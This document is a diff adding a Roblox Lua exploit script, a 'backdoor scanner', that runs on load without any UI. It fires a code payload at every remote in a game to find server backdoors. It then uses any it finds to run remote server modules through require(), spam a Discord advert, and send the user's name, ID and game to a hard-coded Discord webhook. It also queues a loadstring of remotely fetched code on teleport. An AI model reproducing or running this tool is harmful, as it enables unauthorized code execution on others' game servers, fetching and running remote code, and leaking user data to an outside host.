@@ -1,0 +1,197 @@
+-- LALOL Hub Backdoor Scanner - Standalone Instant Execute
+-- No UI, auto-scans and executes immediately
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local LocalPlayer = Players.LocalPlayer
+
+-- Auto queue on teleport
+local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+if queueteleport then
+    queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()")
+end
+
+local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+
+local backdoor = nil
+local searching = false
+local remotes = {}
+
+function debug(text, lvl)
+    local func = print
+    if lvl == 2 then func = error end
+    if lvl == 3 then func = warn end
+    func('LALOL Hub Backdoor: ' .. text)
+end
+
+function notify(text)
+    game:GetService('StarterGui'):SetCore(
+        "SendNotification",
+        {
+            Title = "LALOL Hub Backdoor",
+            Duration = 6,
+            Text = text
+        }
+    )
+end
+
+function generateName(length)
+    local text = ''
+    for i = 1, length do
+        text = text .. alphabet[math.random(1, #alphabet)]
+    end
+    return text
+end
+
+function runRemote(remote, data)
+    if remote:IsA('RemoteEvent') then
+        remote:FireServer(data)
+    elseif remote:IsA('RemoteFunction') then
+        task.spawn(function()
+            pcall(function() remote:InvokeServer(data) end)
+        end)
+    end
+end
+
+function findRemote()
+    local timee = os.clock()
+    remotes = {}
+
+    -- Check for protected backdoor first
+    local protected_backdoor = ReplicatedStorage:FindFirstChild('lh' .. game.PlaceId / 6666 * 1337 * game.PlaceId)
+    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+        while true do
+            local code = generateName(math.random(12, 30))
+            if not remotes[code] then
+                task.spawn(function()
+                    pcall(function()
+                        protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
+                    end)
+                end)
+                remotes[code] = protected_backdoor
+                break
+            end
+        end
+    end
+
+    -- Scan all remotes
+    for _, remote in game:GetDescendants() do
+        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then
+            continue
+        end
+
+        -- Skip RobloxReplicatedStorage
+        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
+            continue
+        end
+
+        -- Skip Adonis Anti-Exploit
+        if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
+            continue
+        end
+
+        -- Skip HD Admin
+        if remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
+            continue
+        end
+
+        -- Skip Chat Events
+        if remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents' then
+            continue
+        end
+
+        -- Send backdoor test
+        local code
+        while true do
+            code = generateName(math.random(12, 30))
+            if not remotes[code] then break end
+        end
+
+        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
+        remotes[code] = remote
+    end
+
+    -- Check for backdoor responses
+    for i = 1, 100 do
+        for code, remote in remotes do
+            if Workspace:FindFirstChild(code) then
+                notify('Backdoor found! ' .. string.format("%.3f", os.clock() - timee) .. 's')
+                backdoor = remote
+                debug(remote:GetFullName(), 3)
+
+                -- Execute backdoor payload
+                runRemote(remote, "require(171016405.1884*69)")
+                runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+
+                -- Webhook log
+                local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+                if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then
+                    pcall(function()
+                        request({
+                            Url = 'https://discord.com/api/webhooks/1108694160464158781/9VCz_ck4ux3M3TQj8moLDq3Nw-dkYDW7gEcaLHKPbe2_JJIz5m2fEh6eSnp33WOLtgi1',
+                            Method = 'POST',
+                            Headers = {
+                                ['Content-Type'] = 'application/json',
+                            },
+                            Body = HttpService:JSONEncode({
+                                username = 'pls dont delete this w3bh00k',
+                                content = "**User: `" .. LocalPlayer.Name .. '` | `' .. LocalPlayer.UserId .. '`\nhttps://www.roblox.com/games/' .. game.PlaceId .. '\n`' .. backdoor:GetFullName() .. '`**',
+                            })
+                        })
+                    end)
+                end
+
+                return true
+            end
+        end
+        task.wait()
+    end
+
+    return false
+end
+
+-- Instant execute on load
+if not searching then
+    searching = true
+    debug('Auto-scanning for backdoors...', 3)
+
+    local success = findRemote()
+    if not success then
+        notify('No backdoor found :(')
+        searching = false
+    end
+end
+
+-- Function to execute code via found backdoor (global for external access)
+function ExecuteBackdoor(code)
+    if not backdoor then
+        notify('No backdoor found yet!')
+        return
+    end
+
+    local a = string.gsub(code, '%%username%%', LocalPlayer.Name)
+
+    local protected_backdoor = ReplicatedStorage:FindFirstChild('lh' .. game.PlaceId / 6666 * 1337 * game.PlaceId)
+    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+        debug('Protected backdoor found', 3)
+        task.spawn(function()
+            local boolValue, variantValue = pcall(function()
+                protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', a)
+            end)
+            if variantValue ~= nil then
+                local splited = string.split(variantValue, ':')
+                notify(splited[#splited])
+            end
+        end)
+    else
+        runRemote(backdoor, a)
+    end
+end
+
+-- Also expose as _G for compatibility
+_G.LALOLExecute = ExecuteBackdoor
+_G.LALOLBackdoor = backdoor
+
+notify('LALOL Backdoor Scanner loaded! Auto-scanning...')
